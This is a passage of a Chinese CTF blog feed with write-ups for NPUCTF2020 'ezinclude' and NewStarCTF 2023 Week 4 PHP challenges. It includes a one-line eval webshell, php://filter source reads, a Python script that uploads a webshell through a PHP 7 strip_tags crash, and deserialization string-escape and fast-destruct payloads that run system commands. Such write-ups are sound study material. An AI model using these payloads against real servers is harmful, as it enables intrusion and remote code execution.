title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="/img/ezinclude1.png" alt="ezinclude1"></p><p>看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">username/password error<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包：</p><p><img src="/img/ezinclude2.png" alt="ezinclude2"></p><p>注意<code>Cookie</code>里给了哈希值，想着这东西会不会要求<code>$pass</code>变量强等于它？不过<code>pass</code>怎么 传也没说，就用<code>GET</code>方法传着试了试：</p><p><img src="/img/ezinclude3.png" alt="ezinclude3"></p><p>访问<code>flflflflag.php</code></p><p><img src="/img/ezinclude4.png" alt="ezinclude4"></p><p>我这个环境不知道怎么回事一直回显<code>404</code>。。只能在<code>bp</code>上看了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">           <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>include($_GET[&quot;file&quot;])<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>文件包含，不过要包含啥也没提示，想着写个一句话进去：</p><p><code>data://text/plain,%3C?php%20@eval($_POST[%27viper%27]);?%3E</code></p><p><img src="/img/ezinclude5.png" alt="ezinclude5"></p><p><code>data</code>,<code>input</code>这种能执行命令的协议都被过滤了，不过<code>filter</code>还能用，尝试读下<code>flflflflag.php</code>源码</p><p><code>/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">           <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">$file=$_GET[&#x27;file&#x27;];</span><br><span class="hljs-meta">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;//is表示忽略大小写加单行匹配</span><br><span class="hljs-meta">die(&#x27;nonono&#x27;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">@include($file);</span><br><span class="hljs-meta">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后面看了<code>wp</code>，用御剑还能扫出来<code>dir.php</code>这么个东西，利用伪协议读他的源码：</p><p>参考<code>https://www.shawroot.cc/1159.html</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//file=php://filter/read=convert.base64-encode/resource=dir.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//获取指定目录（此处为/tmp）中的所有文件和目录，并打印它们的详细信息</span><br><br></code></pre></td></tr></table></figure><p>php7.0的bug：</p><p><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code></p><p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录。该方法仅适用于以下php7版本，php5并不存在该崩溃。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">9</span>一直到<span class="hljs-number">7</span>.<span class="hljs-number">3</span>到现在的版本已被修复<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考https://www.cnblogs.com/Article-kelp/p/14826360.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br><br>url=<span class="hljs-string">&quot;http://5efafd4f-4bae-4237-b3b6-5a8e41058c3c.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;</span> <br><br>phpfile=<span class="hljs-string">&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot;</span> <span class="hljs-comment">#phpfile对应的就是上传的文件的内容</span><br>filedata=&#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:phpfile<br>&#125;<br>bak=res.post(url=url,files=filedata)<br><span class="hljs-built_in">print</span>(bak.text)<br></code></pre></td></tr></table></figure><p>回显：</p><p><img src="/img/ezinclude6.png" alt="ezinclude6"></p><p>接下来就要用到刚才的<code>dir.php</code>了，因为我们上传的一句话被存到<code>tmp</code>目录(文件名我们并不知道，这东西是个临时文件)，访问<code>dir.php</code>就能获得文件名<code>phpgkdwwM</code>：</p><p><img src="/img/ezinclude7.png" alt="ezinclude7"></p><p>蚁剑连接(这里文件名换了是因为环境重开了一次，注意没必要在后面加<code>php</code>后缀)</p><p><img src="/img/ezinlucde1.png" alt="ezinlucde1"></p><p>不过奇怪的是啥都没有。。：</p><p><img src="/img/ezinlucde99.png" alt="ezinlucde99"></p><p>后面想着用蚁剑的插件：</p><p><img src="/img/ezinlude100.png" alt="ezinlude100"></p><p>又去看了wp。。。<code>flag</code>在<code>phpinfo</code>里。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：浅谈PHP可变变量</title>
    <link href="/2023/11/29/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%9C%A8%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/"/>
    <url>/2023/11/29/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9A%E5%8F%AF%E5%8F%98%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%9C%A8%E5%87%BD%E6%95%B0%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>可变变量这里掌握的一直不好，抽空梳理了一下</p><span id="more"></span><hr><h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>源于 <code>[SUCTF 2019]EasyWeb</code>中<code>payload</code>的一部分：&#96;?_&#x3D;$</p>]]></content>
    
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(未做完)Writeup_2023_NewStarCTF_Week4</title>
    <link href="/2023/11/28/week4-Writeup_2023_NewStarCTF_Week4/"/>
    <url>/2023/11/28/week4-Writeup_2023_NewStarCTF_Week4/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第四周，菜鸟的wp</p><span id="more"></span><hr><h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;bad&quot;</span>,<span class="hljs-string">&quot;good&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//经过waf后长度加一</span><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])))); www-data www-data<br></code></pre></td></tr></table></figure><p>简单反序列化字符串逃逸，代码限制了<code>$cmd</code>的值只能是<code>whoami</code>，不过输入的<code>$key</code>可控，同时经过<code>str_replace</code>后<code>bad</code>被换成<code>good</code>，会往后吞一个字符。</p><p>构造<code>&quot;;s:3:&quot;cmd&quot;;s:2:&quot;ls&quot;;&#125;</code>，这东西长度一共<code>22</code>，所以要放<code>22</code>个<code>bad</code>。经过<code>waf</code>后被替换它吐出去。</p><p><code>payload:</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:2:&quot;</span><span class="hljs-built_in">ls</span><span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/justrun1.png" alt="justrun1"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:4:&quot;</span><span class="hljs-built_in">ls</span> /<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/img/juestrun2.png" alt="juestrun2"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$key</span>=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad<span class="hljs-string">&quot;;s:3:&quot;</span>cmd<span class="hljs-string">&quot;;s:9:&quot;</span><span class="hljs-built_in">cat</span> /flag<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p><code>flag&#123;86b29bdb-7b5e-4348-b81e-84953119c4fc&#125;</code></p><h2 id="More-Fast"><a href="#More-Fast" class="headerlink" title="More Fast"></a>More Fast</h2><p>题目描述：再快一点我就能拿到Flag了,如果Destruct能早一点触发就好了…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//调用函数的方式调用一个对象</span><br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//从invoke方法跳到这里</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>))&#123; <br>            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);<span class="hljs-comment">//system(&#x27;cat /fl*&#x27;)</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Not Flag&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123; <span class="hljs-comment">//类被当成字符串处理，从destruct跳到这</span><br>        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;NewStar&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job but nothing&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;fast&#x27;</span>]);<br><br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Nope&quot;</span>);<br>Fatal error: Uncaught <span class="hljs-built_in">Exception</span>: Nope in /<span class="hljs-keyword">var</span>/www/html/index.php:<span class="hljs-number">55</span> Stack trace: <span class="hljs-comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span><br></code></pre></td></tr></table></figure><p>正常<code>pop</code>链构造的题不过底下加了个<code>throw new Exception(&quot;Nope&quot;);</code>。最开始没注意这个东西直接写了链子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//__destruct开头，__toString，__get，__invoke，evil</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">&#x27;ls&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>&#123;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();<br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();<br><span class="hljs-variable">$a</span> -&gt; errMsg = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span> -&gt; obj = <span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; func = <span class="hljs-variable">$d</span>;<br><span class="hljs-variable">$d</span> -&gt; obj = <span class="hljs-variable">$e</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br></code></pre></td></tr></table></figure><p>后面才知道考点是<code>fast destruct</code>，下面的内容参考了：<code>https://eastjun.top/posts/php_unserialize_tricks/</code></p><p>通常反序列化的入口都是<code>__destruct()</code>方法，&#96;&#96;__wakeup()<code>方法的内容一般为反序列化设置了某些限制，需要我们绕过。**如果在反序列化操作之后抛出了异常则会跳过</code>__destruct()<code>函数的执行。可以理解为</code>throw<code>这个函数回收了自动销毁的类，导致</code>destruct<code>检测不到有东西销毁，也就没法触发</code>destruct&#96;函数**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//借用这位师傅文章中的一个栗子：</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Clazz</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$args</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Hacker&quot;</span>);<br><br></code></pre></td></tr></table></figure><p><img src="/img/fastdes1.png" alt="fastdes1"></p><p><code>POST</code>传<code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code>不会得到任何结果。</p><p>因为反序列化操作执行后没有立刻执行<code>__destruct()</code>方法，而是抛出了异常导致<code>__destruct()</code>方法被跳过。但是我们可以修改序列化得到的字符串使得反序列化解析出错，导致<code>__destruct()</code>方法被提前执行。</p><p>我们正常的序列化结果是：<code>O:5:&quot;Clazz&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:4:&quot;args&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>可以修改为：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-comment">//末尾加入数字1</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;args&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span>;<span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//去掉结尾的大括号</span><br>O<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-attr">&quot;Clazz&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">2</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;func&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">6</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;system&quot;</span>;s<span 